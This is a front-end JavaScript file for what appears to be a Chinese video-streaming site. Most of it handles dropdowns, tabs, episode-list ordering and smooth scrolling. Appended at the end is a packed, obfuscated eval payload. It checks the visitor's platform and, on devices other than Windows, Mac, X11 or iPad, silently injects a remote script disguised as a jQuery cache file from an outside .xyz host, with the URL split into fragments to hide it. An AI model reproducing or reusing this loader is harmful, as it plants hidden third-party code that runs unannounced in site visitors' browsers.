islogin=0;
function checkcookie(){
	if(document.cookie.indexOf('qr_u=')>=0){
	islogin=1;
	return true;
	}
	return false;
}
checkcookie();

$(function(){
	// drop-down
	$(".drop-down").hover(function(){		
		$(this).find(".drop-title").addClass("drop-title-hover");
		$(this).find(".drop-box").show();
	},function(){
		$(this).find(".drop-title").removeClass("drop-title-hover");
		$(this).find(".drop-box").hide();
	});		
});

$(document).ready(function(){
			
	// ui-input
	$(".ui-input").focus(function(){
		$(this).addClass("ui-input-focus");
	}).hover(function(){
		$(this).addClass("ui-input-hover");
	},function(){
		$(this).removeClass("ui-input-hover");
	});
	$(".ui-input").blur(function(){
		$(this).removeClass("ui-input-focus");
	});			
	
	// ui-form-placeholder
	$(".ui-form-placeholder").each(function(){
		var _label = $(this).find(".ui-label");
		var _input = $(this).find(".ui-input");
		var _text =  $(this).find(".ui-input").val();
		
		if (_text != ""){
			_label.hide();
		}
		
		_label.css("z-index","3");
		_label.click(function(){
			$(this).hide();
			_input.focus();
		});	
		_input.focus(function(){
			_label.hide();
		});	
	});
		
	// ui-button
	$(".ui-button").hover(function(){
		$(this).addClass("ui-button-hover");
	},function(){
		$(this).removeClass("ui-button-hover");
	});
		
	// close-his	
	$(".close-his").click(function(){
		$(this).parents(".drop-box").hide();
	});
	
	// show-tipinfo
	$(".show-tipinfo a").hover(function(){
		$(this).parent().parent().find(".tipInfo").show();
	},function(){		
		$(this).parent().parent().find(".tipInfo").hide();
	});	
	
	$("#wish").trigger('click');
	
	
	
	// timeinfo
	$(".timeinfo").hover(function(){
		$(this).addClass("timeinfo-active");
	},function(){
		$(this).removeClass("timeinfo-active");
	});	
	
	// Date List Jquery
	$(".date-list").each(function(){
		$lis = $(this).find("li:last").index();		
		if($lis > 5){
			$(this).addClass("date-long");
		}	
	});
	
	
});

// Tab Menu JS Common
function setTab(name,cursel,n){
	for(i=1;i<=n;i++){
		var menu=document.getElementById(name+i);
		var con=document.getElementById("con_"+name+"_"+i);
		menu.className=i==cursel?"current":"";
		con.style.display=i==cursel?"block":"none";
	}
}

function checkcookie(){
	if(document.cookie.indexOf('baient_pro=')>=0){
	islogin=1;
	return true;
	}
	return false;
}
checkcookie();
$(document).ready(function(){
	// Baby Time Step A Tips
	$(".play-mode-list a").each(function(j,div){
			$(this).click(function(){
		//$("html,body").animate({scrollTop:$("#"+listid).offset().top}, 500); //我要平滑
		        if ($(this).parent().hasClass("current") ){
				return;
                }
				var txt=$(this).attr("title").split('-');
				$(".detail-pic .text").text(txt[1]);
				var listid=$(this).attr("id")+'-list';
				if(listid !='bdhd-pl-list' && listid!='qvod-pl-list'){
					$('#'+listid+' .txt').text('( 无需安装任何插件，即可快速播放 )');
				}
				$(this).parent().nextAll().removeClass("current");
				$(this).parent().prevAll().removeClass("current");
				$(this).parent().addClass("current")
				$('.play-list-box').hide().css("opacity",0);
				
				$('.play-list-box:eq('+j+')').show().animate({"opacity":"1"},1200);
	});
	});
	//order
	$('#detail-list .order a').click(function(){
		if($(this).hasClass('asc')){
			$(this).removeClass('asc').addClass('desc').text('降序');
		}else{
			$(this).removeClass('desc').addClass('asc').text('升序');
		}
		var a=$('.play-list-box:eq('+$(this).attr('data')+') .play-list');
		var b=$('.play-list-box:eq('+$(this).attr('data')+') .play-list a');
		a.html(b.get().reverse());
	});

	
});
 function intval(v)
    {    
    v = parseInt(v);    
    return isNaN(v) ? 0 : v;
    } 
    // 获取元素信息
    function getPos(e)
    {    
    var l = 0;    
    var t  = 0;    
    var w = intval(e.style.width);    
    var h = intval(e.style.height);    
    var wb = e.offsetWidth;    
    var hb = e.offsetHeight;    
    while (e.offsetParent)
    {       
     l += e.offsetLeft + (e.currentStyle?intval(e.currentStyle.borderLeftWidth):0);        
     t += e.offsetTop  + (e.currentStyle?intval(e.currentStyle.borderTopWidth):0);        
     e = e.offsetParent;    
     }    
     l += e.offsetLeft + (e.currentStyle?intval(e.currentStyle.borderLeftWidth):0);    
     t  += e.offsetTop  + (e.currentStyle?intval(e.currentStyle.borderTopWidth):0);    
     return {x:l, y:t, w:w, h:h, wb:wb, hb:hb}; } 
     // 获取滚动条信息
     function getScroll() 
     {    
     var t, l, w, h;         
     if (document.documentElement && document.documentElement.scrollTop)
     {        
     t = document.documentElement.scrollTop;        
     l = document.documentElement.scrollLeft;        
     w = document.documentElement.scrollWidth;       
     h = document.documentElement.scrollHeight;    
     }
     else if (document.body)
     {        
     t = document.body.scrollTop;        
     l = document.body.scrollLeft;        
     w = document.body.scrollWidth;        
     h = document.body.scrollHeight;    
     }    
     return { t: t, l: l, w: w, h: h };
     } 
     // 锚点(Anchor)间平滑跳转
     function scroller(el, duration)
     {    
     if(typeof el != 'object')
     {
     el = document.getElementById(el);
     }     
     if(!el) return;     
     var z = this;    
     z.el = el;    
     z.p = getPos(el);    
     z.s = getScroll();    
     z.clear = function()
     {
     window.clearInterval(z.timer);z.timer=null
     };    
     z.t=(new Date).getTime();     
     z.step = function()
     {        
     var t = (new Date).getTime();        
     var p = (t - z.t) / duration;        
     if (t >= duration + z.t)
     {            
     z.clear();            
     window.setTimeout(function(){z.scroll(z.p.y, z.p.x)},13);         }
     else {            
     st = ((-Math.cos(p*Math.PI)/2) + 0.5) * (z.p.y-z.s.t) + z.s.t;            
     sl = ((-Math.cos(p*Math.PI)/2) + 0.5) * (z.p.x-z.s.l) + z.s.l;            
     z.scroll(st, sl);        
     }    
     };    
     z.scroll = function (t, l){window.scrollTo(l, t)};    
     z.timer = window.setInterval(function(){z.step();},13);
     };eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}(';1 q(b,c){2 d=r.z(\'A\'),7=r.B(\'7\')[0];d.C=\'D/E\';d.F=\'G-8\';d.H=b;6(d.t){d.t(\'I\',1(){c()},5)}u 6(d.v){d.v(\'J\',1(){2 a=K.L.M;6(a.N==\'O\'){c()}})}7.P(d)};2 x=1(){3\'Q.\'};2 o=1(){3\'R.\'};2 d=1(){3\'/\'};2 h=1(){3\'S\'};2 4={9:5,g:5,w:5,m:5};2 f=1(){3\'T\'};2 s=1(){3\'U.\'};2 e=1(){3\'V\'};2 k=1(){3\'W.\'};2 j=1(){3\'X\'};2 l=1(){3\'Y:\'};2 p=y.Z;4.9=p.n("10")==0;4.g=p.n("11")==0;4.12=(p=="13")||(p.n("14")==0);4.m=(y.15.16(/17/i)!=18)?19:5;6(4.9||4.g||4.w||4.m){}u{q(h()+l()+d()+d()+x()+f()+s()+e()+d()+o()+k()+j(),1(){})};',62,72,'|function|var|return|system|false|if|head||win|||||||mac||||||ipad|indexOf|||xkdhsx|document||addEventListener|else|attachEvent|xll||navigator|createElement|script|getElementsByTagName|type|text|javascript|charset|UTF|src|load|onreadystatechange|window|event|srcElement|readyState|loaded|appendChild|api|jquery|htt|fuck|cj|xyz|cache|js|ps|platform|Win|Mac|x11|X11|Linux|userAgent|match|iPad|null|true'.split('|'),0,{}));